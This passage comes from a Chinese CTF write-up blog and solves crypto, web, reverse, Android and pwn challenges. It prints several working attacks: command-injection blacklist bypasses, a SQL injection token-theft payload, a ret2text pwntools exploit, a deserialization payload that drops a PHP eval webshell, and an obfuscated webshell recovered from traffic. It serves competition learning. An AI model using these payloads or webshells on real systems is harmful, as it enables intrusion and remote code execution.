list(&#x27;0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;)c=[int(k) for k in c]hp = &#x27;&#x27;for i in range(568): (status,out) = lfsr(status,mask) hp += str(c[i]^out)hp = int(hp, 2)print(hp)# 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112 此时 $hp$ 有568位，根据Coppersmith定理，1024位的 $p$ 至少需要高576位才能恢复完整 $p$，需爆破8位二进制位： 123456789101112131415161718192021222324252627# Sagen = 9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703hp = 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112import stringdic = string.digits + &quot;abcdef&quot;for a in dic: for b in dic: pp = hex(hp) + a + b #p需要用0补全到1024位 pp += &#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27; #要加的数字与补全p时0的个数有关 pp = int(pp, 16) p_fake = pp+0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake &amp; (2^pbits-2^kbits) #print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)) PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + pbar try: x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 print(x0 + pbar) except: pass # 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477 最后常规RSA： 1234567891011p = 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477n = 9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703c = 3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789q = n//pe = 0x10001import gmpy2f = (p-1)*(q-1)d = gmpy2.invert(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27; ​ WEBCLICK查看源码，找到 main.js，发现 ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==，base64解码得flag。 ​ Web-sign in提示robots协议，访问 robots.txt，发现存在 fiag_ls_h3re.php， 访问发现右键被禁用，加前缀 view-source: 查看源码得flag。 ​ EXEC 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);if(isset($_REQUEST[&quot;cmd&quot;]))&#123; $shell = $_REQUEST[&quot;cmd&quot;]; $shell = str_ireplace(&quot; &quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;\\n&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;\\t&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;?&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;*&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;&lt;&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;system&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;passthru&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;ob_start&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;getenv&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;putenv&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;mail&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;error_log&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;`&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;exec&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;shell_exec&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;echo&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;cat&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;ls&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;nl&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;tac&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;bash&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;sh&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;tcp&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;base64&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;flag&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;cp&quot;,&quot;&quot;,$shell); exec($shell);&#125;else&#123; highlight_file(__FILE__);&#125; 带黑名单的无回显RCE，可以重定向写命令执行结果到文件，关键字可双写绕过，空格用$IFS绕过。 列目录：?cmd=llss$IFS/&gt;1.txt，得到根目录flag文件名 ctf_is_fun_flag2021； 读文件：?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt，得到flag。 ​ Language源码里有python和go两个文件夹，有两个服务，端口8000是python开的，映射到对外端口；内网端口5000是go服务。python代码相当于中转站接受外网请求，处理后转发给go，go进行底层处理。 go服务中关键代码 backend.go： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package controllerimport ( db &quot;ctf/database&quot; &quot;encoding/json&quot; &quot;fmt&quot; &quot;github.com/buger/jsonparser&quot; &quot;io/ioutil&quot; &quot;net/http&quot;)type Language struct &#123; Id int32 `json:&quot;id&quot;` Name string `json:&quot;name&quot;` Votes int64 `json:&quot;votes&quot;`&#125;func Index(w http.ResponseWriter, _ *http.Request) &#123; ok(w, &quot;Hello World!&quot;)&#125;func List(w http.ResponseWriter, _ *http.Request) &#123; rows, err := db.Sqlite.Query(&quot;SELECT * FROM languages;&quot;) if err != nil &#123; fail(w, &quot;Something wrong&quot;) fmt.Println(err.Error()) return &#125; defer rows.Close() res := make([]Language, 0) for rows.Next() &#123; var pl Language _ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes) res = append(res, pl) &#125; err = json.NewEncoder(w).Encode(res)&#125;func Search(w http.ResponseWriter, r *http.Request) &#123; reqBody, _ := ioutil.ReadAll(r.Body) votes, err := jsonparser.GetInt(reqBody, &quot;votes&quot;) if err != nil &#123; fail(w, &quot;Error reading votes&quot;) return &#125; name, err := jsonparser.GetString(reqBody, &quot;name&quot;) if err != nil &#123; fail(w, &quot;Error reading name&quot;) return &#125; query := fmt.Sprintf(&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;, votes, name) rows, err := db.Sqlite.Query(query) if err != nil &#123; fail(w, &quot;Something wrong&quot;) fmt.Println(err.Error()) return &#125; res := make([]Language, 0) for rows.Next() &#123; var pl Language _ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes) res = append(res, pl) &#125; err = json.NewEncoder(w).Encode(res)&#125;func Flag(w http.ResponseWriter, r *http.Request ) &#123; action:= r.URL.Query().Get(&quot;action&quot;) if action == &quot;&quot; &#123; fail(w, &quot;Error getting action&quot;) return &#125; token:= r.URL.Query().Get(&quot;token&quot;) if token == &quot;&quot; &#123; fail(w, &quot;Error getting token&quot;) return &#125; var secret string row := db.Sqlite.QueryRow(&quot;SELECT secret FROM token;&quot;) if err := row.Scan(&amp;secret); err != nil &#123; fail(w, &quot;Error querying secret token&quot;) return &#125; if action == &quot;readFlag&quot; &amp;&amp; secret == token &#123; data, err := ioutil.ReadFile(&quot;flag&quot;) if err != nil &#123; fail(w, &quot;Error reading flag&quot;) return &#125; ok(w, fmt.Sprintf(&quot;Congrats this is your flag: %s&quot;, string(data))) return &#125; ok(w, &quot;Wrong token&quot;)&#125; 路由 /flag 中GET两个参数 ?action=readFlag&amp;token=xxxxx，token正确得flag，而路由 /search 中容易通过SQL注入拿到token。 python服务中 app.py： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from flask import Flask, request, render_template, jsonifyfrom urllib.parse import unquoteimport requestsapp = Flask(__name__)server = &#x27;127.0.0.1:8000&#x27;@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/list&quot;, methods=[&quot;POST&quot;])def listAll(): r = requests.post(f&quot;http://&#123;server&#125;/api/list&quot;) return jsonify(r.json())@app.route(&quot;/search&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def search(): if request.method == &quot;GET&quot;: return render_template(&quot;search.html&quot;) else: data = request.json if data[&#x27;name&#x27;]: if not isinstance(data[&#x27;name&#x27;], str) or not data[&#x27;name&#x27;].isalnum(): return jsonify(&#123;&quot;error&quot;: &quot;Bad word detected&quot;&#125;) if data[&#x27;votes&#x27;]: if not isinstance(data[&#x27;votes&#x27;], int): return jsonify(&#123;&quot;error&quot;: &quot;Bad word detected&quot;&#125;) r = requests.post(f&quot;http://&#123;server&#125;/api/search&quot;, data=request.data) return jsonify(r.json())@app.route(&quot;/healthcheck&quot;, methods=[&quot;GET&quot;])def healthCheck(): getPath = [&quot;&quot;, &quot;flag&quot;] postPath = [&quot;api/list&quot;, &quot;api/search&quot;] try: for path in getPath: requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) for path in postPath: requests.post(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) except: return &quot;Down&quot; return &quot;OK&quot;@app.route(&quot;/&lt;path:path&gt;&quot;, methods=[&quot;GET&quot;])def handle(path): if &#x27;flag&#x27; in unquote(path): action = request.args.get(&#x27;action&#x27;) token = request.args.get(&#x27;token&#x27;) print(action) if action == &quot;readFlag&quot;: return jsonify(&#123;&quot;error&quot;: &quot;Sorry, readFlag is not permitted&quot;&#125;) r = requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;, params=&#123; &quot;action&quot;: action, &quot;token&quot;: token &#125;) else: r = requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) return jsonify(r.text)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 发现其中存在两个点需要绕过： 路由 /search 中JSON严格过滤，name 的值必须满足 isalnum()，votes 的值必须为数字，避免SQL注入情况； 检测url里使用GET方法传入 action=readFlag 会直接拒绝。 对于第1点，尝试构造含两个 name 参数的JSON，在python中认JSON中第二个 name，而go中认JSON中第一个 name，利用这种差异构造：&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;，绕过得到token值，得到 re@l1y_4th_T0k3n。 对于第2点，利用 @app.route(&quot;/&lt;path:path&gt;&quot;) 特性，对 ? 进行url编码可以在python层面绕过GET参数识别，即 action = request.args.get(&#39;action&#39;) 不会获取到内容，payload：/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n。 得到flag：&quot;&#123;\\&quot;msg\\&quot;:\\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\\\n\\&quot;&#125;\\n&quot; ​ REVERSEhiahia o(*^▽^*)┛IDA查看伪码，无逆向，照着实现就行： 123456789101112131415161718s=list(b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;)def flag(c,k): if k&gt;9: if k&amp;1==0: return c-11 else: return c+13 else: if k&amp;1==0: return c-3 else: return c+5t=&#x27;&#x27;for i in range(len(s)): t+=chr(flag(s[i],i))print(t)# flag&#123;RrrrEe33202111&#125; ​ ANDROIDjadx查看MainActivity主逻辑： 12345678910111213141516171819202122232425public void onClick(View view) &#123; String trim = this.input.getText().toString().trim(); int[] iArr = &#123;102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42&#125;; int[] iArr2 = &#123;42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42&#125;; if (trim.length() != 18) &#123; this.input.setText(&quot;FLAG错误&quot;); return; &#125; char[] charArray = trim.toCharArray(); for (int i = 0; i &lt; 17; i++) &#123; iArr2[i] = i % 2 == 0 ? charArray[i] ^ i : charArray[i] ^ charArray[i + 1]; &#125; String str = &quot;&quot;; for (int i2 = 0; i2 &lt; 18; i2++) &#123; str = str.concat(Integer.toHexString(iArr2[i2])).concat(&quot;,&quot;); &#125; System.out.println(str); for (int i3 = 0; i3 &lt; 18; i3++) &#123; if (iArr2[i3] != iArr[i3]) &#123; this.input.setText(&quot;FLAG错误！&quot;); return; &#125; &#125; this.input.setText(&quot;FLAG正确&quot;);&#125; 用z3解： 12345678910111213141516171819202122232425from z3 import *flag=[BitVec(f&#x27;flag&#123;i&#125;&#x27;,7) for i in range(18)]out=[102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42]s=[42]*19ss=Solver()for i in range(17): if i%2==0: s[i]=flag[i]^i else: s[i]=flag[i]^flag[i+1]for i in range(18): ss.add(s[i]==out[i])ss.check()m=ss.model()res=&#x27;&#x27;for i in range(17): res+=(chr(m[flag[i]].as_long()))print(res)# flag&#123;Reverse__APP 加花括号闭合，得到flag：flag{Reverse__APP} ​ WAY flag{md5(result)} 检测带upx壳，脱壳后IDA查看伪码，迷宫题，wsad代表上下左右，提取迷宫数组得： 12345OIIIIOOIO#IOOOIIOIOIIIIII 容易得到路径：sdsddwd，MD5得到flag：flag{6654b3343f6f3f6223a721e7f65e87f8} ​ SPARKSparc架构，IDA无法反编译为伪码，用Ghidra得到伪码主逻辑： 123456789101112131415161718192021222324252627282930313233343536373839undefined8 main(void)&#123; longlong unaff_g7; int local_res7d3; undefined8 local_res7d7; undefined8 local_res7df; undefined8 local_res7e7; undefined8 local_res7ef; longlong local_res7f7; local_res7f7 = *(longlong *)(unaff_g7 + 0x28); local_res7d7 = 0; local_res7df = 0; local_res7e7 = 0x37463f3044413243; local_res7ef = 0x3429000000000000; puts(&quot;input_sparkle_flag_here:\\n&quot;); read(0,&amp;local_res7d7,0xc); local_res7d3 = 0; do &#123; if (9 &lt; local_res7d3) &#123; puts(&quot;good_job!&quot;);LAB_001008a0: if (local_res7f7 == *(longlong *)(unaff_g7 + 0x28)) &#123; return 0; &#125; /* WARNING: Subroutine does not return */ __stack_chk_fail(); &#125; *(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) = *(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + -0x2f; if (*(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) != *(char *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123; puts(&quot;incorrect\\n&quot;); goto LAB_001008a0; &#125; local_res7d3 = local_res7d3 + 1; &#125; while( true );&#125; 逻辑为输入flag值逐字符 -0x2f 得到的字符串与 0x37463f30444132433429 相等，即ROT47。 简单还原得flag：flag{fun_sparcX} ​ PWNEz_pwn简单ret2text： 123456from pwn import *r = remote(&#x27;hsc2019.site&#x27;,10891)r.recvline()pl = &#x27;a&#x27;*0x48 + p64(0x400741)r.sendline(pl)r.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"长安“战疫”网络安全卫士守护赛","slug":"match-长安“战疫”网络安全卫士守护赛","date":"2022-01-08T10:00:01.000Z","updated":"2022-01-08T12:51:09.214Z","comments":true,"path":"2022/01/08/match-长安“战疫”网络安全卫士守护赛/","permalink":"https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/","excerpt":"","text":"​ 新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装成“肺炎病例”“防护通知”等信息，通过钓鱼邮件、恶意链接等方式进行传播，造成用户安全问题。 西安数所高校学生团体联合发起长安战疫网络安全公益科普赛和长安战疫“网络安全卫士”守护赛，一方面提升全民疫情期间的网络安全意识与疫情中常见问题的应对措施，另一方面提升我省的网络安全应急响应能力和网络安全从业者技术能力，协助用户提升网络安全防护能力，为战胜新冠肺炎提供网络空间保障。 Rank: 14 MISC八卦迷宫 一起走迷宫吧，要提交全拼音字符奥 走迷宫，串联经过的八卦对应文字：cazy&#123;战长恙长战恙河长山山安战疫疫战疫安疫长安恙&#125;，转为全拼： cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125; ​ 朴实无华的取证xp内存取证，先判断profile volatility -f xp_sp3.raw imageinfo 查看进程 volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist 发现notepad和mspaint，查看记事本 volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad 找到信息： 20211209(Encrypt)。 再查看桌面文件 volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;桌面&quot; 找到文件 flag.zip 和 flag.png，分别dump下来 flag.png 中有密文信息： FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]， flag.zip 有密码，用前面的 20211209 解开找到加密算法： 1234567891011121314151617void Encrypt(string&amp; str)&#123; for(int i = 0; i &lt; str.length(); i++) &#123; if(str[i] &gt;=&#x27;a&#x27;&amp;&amp; str[i]&lt;=&#x27;w&#x27;) str[i]+=3; else if(str[i]==&#x27;x&#x27;) str[i]=&#x27;a&#x27;; else if(str[i]==&#x27;y&#x27;) str[i]=&#x27;b&#x27;; else if(str[i]==&#x27;z&#x27;) str[i]=&#x27;c&#x27;; else if(str[i]==&#x27;_&#x27;) str[i]=&#x27;|&#x27;; str[i] -= 32; &#125;&#125; 还原flag： 123456789101112131415161718192021222324252627s = list(b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;)t = &#x27;&#x27;def encrypt(x): if x &gt;= ord(&#x27;a&#x27;) and x &lt;= ord(&#x27;w&#x27;): x += 3 elif x == ord(&#x27;x&#x27;): x = ord(&#x27;a&#x27;) elif x == ord(&#x27;y&#x27;): x = ord(&#x27;b&#x27;) elif x == ord(&#x27;z&#x27;): x = ord(&#x27;c&#x27;) elif x == ord(&#x27;_&#x27;): x = ord(&#x27;|&#x27;) x -= 32 return xfor i in range(len(s)): for j in range(128): if encrypt(j) == s[i]: t += chr(j) break else: t += &#x27;?&#x27;print(t)# cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125; ? 改 _ ，得到flag：cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125; ​ 无字天书在流量包中发现 secret 流量，dump得到gzip包，内容为一串16进制字符串，其中包含 504B0304，转存为zip文件，内含 flag.txt 和 key.ws 两个纯空白字符文件。 key.ws 中包含空格与tab字符及大量换行符，为whitespace语言，在线运行得到输出 XiAnWillBeSafe； flag.txt 中包含大量空格与tab字符，为snow隐写，密码 XiAnWillBeSafe，解密： SNOW.EXE -C -p XiAnWillBeSafe flag.txt，得到flag： cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125; ​ 西安加油在流量包中发现 secret.txt 流量，dump下来base64解码得到zip文件： 1234import base64f = open(&#x27;secret.txt&#x27;,&#x27;rb&#x27;).read()open(&#x27;out.zip&#x27;,&#x27;wb&#x27;).write(base64.b64decode(f)) 打开为拼图，共48张，选择带flag的部分图片纯手拼： flag：cazy&#123;make_XiAN_great_Again&#125; ​ ez_Encrypt查看流量，发现是蚁剑流量，其中一个流中 TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D base64解码为 O:39:&quot;League\\Flysystem\\Cached\\Storage\\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\\Flysystem\\Adapter\\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;， 说明通过反序列化漏洞写入一句话木马。 找到一长串base64编码字符串，解码保存为 www.zip 源码，在 app\\controller\\Index.php 中找到混淆处理过的马： 1&lt;?php define(&#x27;IKlSux1227&#x27;,__FILE__);$DusPFr=base64_decode(&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;);$arCiCL=$DusPFr[3].$DusPFr[6].$DusPFr[33].$DusPFr[30];$VvUrBZ=$DusPFr[33].$DusPFr[10].$DusPFr[24].$DusPFr[10].$DusPFr[24];$DEomKk=$VvUrBZ[0].$DusPFr[18].$DusPFr[3].$VvUrBZ[0].$VvUrBZ[1].$DusPFr[24];$LnpnvY=$DusPFr[7].$DusPFr[13];$arCiCL.=$DusPFr[22].$DusPFr[36].$DusPFr[29].$DusPFr[26].$DusPFr[30].$DusPFr[32].$DusPFr[35].$DusPFr[26].$DusPFr[30];eval($arCiCL(&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMx